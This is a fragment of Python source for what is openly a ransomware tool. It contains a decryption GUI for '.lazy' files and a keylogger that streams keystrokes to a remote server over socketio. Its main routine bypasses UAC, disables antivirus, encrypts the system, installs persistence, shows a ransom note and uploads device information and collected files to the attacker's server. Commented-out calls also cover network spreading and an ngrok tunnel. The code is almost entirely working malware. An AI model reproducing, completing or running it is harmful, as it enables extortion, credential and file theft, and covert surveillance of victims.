                log_box.insert(tk.END, "[*] Scanning for .lazy files...\n")
                log_box.update()

                found = []
                for root_dir, _, files in os.walk(self.sysRoot):
                    for file in files:
                        if file.endswith(self.encrypted_extension):
                            found.append(os.path.join(root_dir, file))

                if not found:
                    log_box.insert(tk.END, "[!] No encrypted files found.\n")
                    messagebox.showinfo("Done", "No encrypted files found.")
                    return

                log_box.insert(tk.END, f"[✓] Found {len(found)} encrypted file(s).\n")
                log_box.update()

                for file_path in found:
                    self.decrypt_all_layers(file_path)
                    log_box.insert(tk.END, f"Decrypted: {file_path}\n")
                    log_box.see(tk.END)
                    log_box.update()

                messagebox.showinfo("Success", "All files have been decrypted.")
                root.destroy()

            except Exception as e:
                messagebox.showerror("Error", f"Decryption failed: {e}")
                log_box.insert(tk.END, f"[!] Decryption failed: {e}\n")

        

        btn_decrypt = tk.Button(frame, text="Decrypt Now", command=unified_decrypt,
                                font=("Courier New", 12), bg="lime", fg="black", width=24)
        btn_decrypt.pack(pady=(10, 10))

        attempt_auto_load_key()
        root.mainloop()




    def start_keylogger(self):
        from pynput.keyboard import Listener, Key
        import socketio

        hostname = socket.gethostname()
        sio = socketio.Client()

        try:
            sio.connect(SERVER_URL)

            def on_press(key):
                try:
                    # Karakter biasa
                    if hasattr(key, "char") and key.char is not None:
                        log = key.char
                    # Tombol khusus
                    elif key == Key.enter:
                        log = "\n"
                    elif key == Key.tab:
                        log = "\t"
                    elif key == Key.space:
                        log = " "
                    else:
                        return  # Abaikan tombol lain seperti Ctrl, Shift, dll

                    sio.emit("keylog", {"hostname": hostname, "log": log})

                except Exception as e:
                    print(f"[Keylogger] Error: {e}")

            listener = Listener(on_press=on_press)
            listener.start()

        except Exception as e:
            print(f"[Keylogger] Gagal konek ke server: {e}")


    

def main():
    rw = RansomWare()
    if getattr(sys, "restarting", False):
        rw.show_ransom_note()
    else:
        # Eksekusi normal
        sys.restarting = True
    # First try silent UAC bypass
    if not rw.silent_uac_bypass():
        print("[!] Failed to elevate privileges silently")
        return
    if not rw.run_as_admin():
        print("[!] Tidak bisa melanjutkan tanpa akses administrator.")
        return
    rw.disable_uac_completely()
    rw.try_disable_antivirus()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_key_with_rsa()
    rw.change_desktop_background()
    for method in rw.persistence_methods:
        method()
    rw.ransom_note()
   
    # rw.start_keylogger()
    rw.send_device_info(SERVER_URL, API_TOKEN)
    rw.collect_and_send_files(SERVER_URL, API_TOKEN)
    rw.deploy_to_startup(script_path=sys.argv[0])
    

    # rw.start_ngrok_tunnel(port=3389 if os.name == "nt" else 5900)
    t3 = threading.Thread(target=rw.start_keylogger, daemon=True)
    #t4 = threading.Thread(target=rw.check_for_commands, daemon=True)
    # rw.spread_to_network_hosts(local_file=sys.argv[0])
    t1 = threading.Thread(target=rw.show_ransom_note)
    # t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    t3.start()
    #t4.start()
    print(
        "> RansomWare: Attack completed on target machine and system is encrypted"
    )  # Debugging/Testing
    print(
        "> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine"
    )  # Debugging/Testing
    # t2.start()
    print("> RansomWare: Target machine has been un-encrypted")  # Debugging/Testing
    print("> RansomWare: Completed")  # Debugging/Testing


if __name__ == "__main__":
    main()
